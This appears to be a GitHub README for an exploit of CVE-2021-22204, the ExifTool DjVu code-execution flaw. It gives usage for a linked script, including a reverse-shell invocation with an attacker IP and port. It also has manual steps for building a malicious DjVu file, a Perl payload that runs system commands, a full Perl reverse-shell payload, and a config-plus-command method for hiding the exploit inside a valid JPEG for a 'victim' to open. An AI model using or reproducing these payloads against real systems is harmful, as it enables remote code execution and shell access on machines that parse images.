# CVE-2021-22204

## Description

Improper neutralization of user data in the DjVu file format in ExifTool versions 7.44 and up allows arbitrary code execution when parsing the malicious image


## Script

[Script Link](./CVE-2021-22204.sh)


![image](https://user-images.githubusercontent.com/5285547/128046966-73d274e6-dbc8-4787-8a62-a8173dff4ab1.png)

### Script usage:

System cmd:
```
bash CVE-2021-2204.sh "system('id')" happy.jpg 
```

Reverse shell
```
bash CVE-2021-2204.sh "reverseme 10.10.10.10 9999" happy.jpg
```
*Your IP and PORT


## Manual Exploit

```
$ sudo apt install djvulibre-bin
# Installs the required tools
 
$ bzz payload payload.bzz
# Compress our payload file with to make it non human-readable
 
$ djvumake exploit.djvu INFO='1,1' BGjp=/dev/null ANTz=payload.bzz
# INFO = Anything in the format 'N,N' where N is a number
# BGjp = Expects a JPEG image, but we can use /dev/null to use nothing as background image
# ANTz = Will write the compressed annotation chunk with the input file
```

Payload

```
(metadata "\c${system('id')};")
```

Payload (for reversehell)

```
(metadata "\c${use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in(9999,inet_aton('localhost')))){open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');exec('/bin/sh -i');};};#")
```

Then, when the victim opens the file exploit.djvu with a vulnerable version  
of Exiftool our embedded Perl code will execute the command id .

# Config file for Exiftool

```
%Image::ExifTool::UserDefined = (
    # All EXIF tags are added to the Main table, and WriteGroup is used to
    # specify where the tag is written (default is ExifIFD if not specified):
    'Image::ExifTool::Exif::Main' => {
        # Example 1.  EXIF:NewEXIFTag
        0xc51b => {
            Name => 'HasselbladExif',
            Writable => 'string',
            WriteGroup => 'IFD0',
        },
        # add more user-defined EXIF tags here...
    },
);
1; #end%
```

What this file does is make possible that we write a new tag on the file, with the name HasselbladExif and the bytes 0xc51b to identify it inside our new file. Then we can insert it inside of any file. [8]Then use it and our already made exploit.djvu to insert the malicious DjVu file inside a valid JPEG

```
$ exiftool -config configfile '-HasselbladExif<=exploit.djvu' hacker.jpg

configfile = The name of our configuration file;
-HasselbladExif = Tag name that are specified in the config file;
exploit.djvu = Our exploit, previously made with djvumake;
hacker.jpg = A valid JPEG file;
```


Credits and help: https://blog.convisoappsec.com/en/a-case-study-on-cve-2021-22204-exiftool-rce/
